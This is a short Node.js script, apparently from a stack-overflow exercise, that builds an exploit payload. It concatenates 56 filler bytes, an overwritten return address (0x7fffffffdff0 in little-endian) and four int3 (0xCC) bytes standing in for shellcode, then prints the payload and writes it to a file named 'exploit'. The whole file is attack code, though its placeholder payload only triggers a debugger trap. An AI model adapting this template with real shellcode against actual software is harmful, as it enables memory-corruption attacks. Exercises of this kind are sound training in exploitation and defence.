'use strict'
const fs = require('fs');

var bb = Buffer.from('AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGG');
var int3 = Buffer.from([0xcc,0xcc,0xcc,0xcc]);
var memoria = Buffer.from([0x00,0x00,0x7f,0xff,0xff,0xff,0xdf,0xf0].reverse());

var exploit = Buffer.concat([bb, memoria,int3]);

console.log(exploit+"");
var arquivo = fs.createWriteStream('exploit');
arquivo.write(exploit);

